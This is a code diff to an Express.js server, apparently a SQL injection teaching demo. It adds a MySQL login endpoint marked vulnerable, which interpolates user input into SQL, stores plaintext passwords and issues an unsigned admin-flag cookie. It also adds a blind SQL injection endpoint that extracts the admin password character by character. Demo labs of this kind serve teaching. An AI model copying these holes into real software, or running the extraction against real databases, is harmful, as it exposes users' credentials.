@@ -1,6 +1,7 @@
 require('dotenv').config();
 const express = require('express');
 const { Pool } = require('pg');
+const mysql = require('mysql2/promise');
 const cookieParser = require('cookie-parser');
 const path = require('path');
 const cors = require('cors');
@@ -8,13 +9,22 @@ const cors = require('cors');
 const app = express();
 const port = process.env.PORT || 3000;
 
-// Database connection
+// PostgreSQL pool
 const pool = new Pool({
   user: process.env.DB_USER,
   host: process.env.DB_HOST,
   database: process.env.DB_NAME,
   password: process.env.DB_PASSWORD,
   port: process.env.DB_PORT,
+});
+
+// MySQL pool
+const mysqlPool = mysql.createPool({
+  host: process.env.MYSQL_HOST,
+  port: process.env.MYSQL_PORT,
+  user: process.env.MYSQL_USER,
+  password: process.env.MYSQL_PASSWORD,
+  database: process.env.MYSQL_DATABASE,
 });
 
 // Middleware
@@ -82,6 +92,30 @@ app.post('/api/login', async (req, res) => {
   }
 });
 
+// Login endpoint for MySQL (vulnerable)
+app.post('/api/login-mysql', async (req, res) => {
+  try {
+    const { username, password } = req.body;
+    const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
+    console.log('MySQL Executing query:', query);
+    const [rows] = await mysqlPool.query(query);
+    if (rows.length > 0) {
+      const user = rows[0];
+      res.cookie('session', Buffer.from(JSON.stringify({
+        id: user.id,
+        username: user.username,
+        is_admin: user.is_admin
+      })).toString('base64'), { maxAge: 3600000, httpOnly: true });
+      res.json({ success: true, message: 'Login successful (MySQL)' });
+    } else {
+      res.json({ success: false, message: 'Invalid credentials (MySQL)' });
+    }
+  } catch (err) {
+    console.error('Login error (MySQL):', err);
+    res.status(500).json({ success: false, message: 'An error occurred during login (MySQL)' });
+  }
+});
+
 // User info endpoint - will return data based on session cookie
 app.get('/api/user', (req, res) => {
   if (!req.cookies.session) {
@@ -136,6 +170,46 @@ app.post('/api/blind-sql-injection', async (req, res) => {
         }
       } catch (err) {
         // Ignore errors for this demo
+      }
+    }
+    if (!found) {
+      finished = true;
+    }
+  }
+  if (extractedPassword.length > 0) {
+    res.write(JSON.stringify({ type: 'done', password: extractedPassword }) + '\n');
+  } else {
+    res.write(JSON.stringify({ type: 'done', password: null }) + '\n');
+  }
+  res.end();
+});
+
+// Blind SQL Injection API endpoint for MySQL (streaming)
+app.post('/api/blind-sql-injection-mysql', async (req, res) => {
+  res.setHeader('Content-Type', 'application/json; charset=utf-8');
+  res.setHeader('Transfer-Encoding', 'chunked');
+  const TARGET_USER = 'admin';
+  const CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=';
+  const MAX_LENGTH = 30;
+  let extractedPassword = '';
+  let finished = false;
+  for (let i = 1; i <= MAX_LENGTH && !finished; i++) {
+    let found = false;
+    for (const char of CHARS) {
+      // Blind SQL injection payload para MySQL
+      const payload = `${TARGET_USER}' AND SUBSTRING(password, ${i}, 1) = '${char}' -- `;
+      const query = `SELECT * FROM users WHERE username = '${payload}' AND password = 'anything'`;
+      try {
+        const [rows] = await mysqlPool.query(query);
+        res.write(JSON.stringify({ type: 'progress', position: i, char }) + '\n');
+        if (rows.length > 0) {
+          extractedPassword += char;
+          found = true;
+          res.write(JSON.stringify({ type: 'found', position: i, char, partial: extractedPassword }) + '\n');
+          break;
+        }
+      } catch (err) {
+        // Ignora erros
       }
     }
     if (!found) {
